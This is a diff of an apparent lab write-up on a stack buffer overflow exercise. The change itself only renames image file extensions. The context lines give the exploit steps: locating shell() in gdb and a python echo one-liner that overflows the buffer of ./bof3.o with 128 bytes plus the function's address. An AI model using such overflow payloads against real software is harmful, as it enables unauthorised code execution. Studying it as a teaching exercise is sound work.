@@ -28,13 +28,13 @@ void main()
 1. Get the address of *shell()*:
    - Load the program into *gdb* and type `disas shell`
      
-     ![](img/bof3/shell.jpg)
+     ![](img/bof3/shell.JPG)
      
    - The first line show us the address of *shell()* which is `0x0804845b`
 2. Do the attack:
    - To overflow the memory, we need to input *128 random bytes* + *4 byte address of shell()*
    - Quit *gdb* and type `echo $(python -c "print('a'*128 + '\x5b\x84\x04\x08')") | ./bof3.o`
      
-     ![](img/bof3/attackbof3.jpg)
+     ![](img/bof3/attackbof3.JPG)
      
    - Goal achieved!
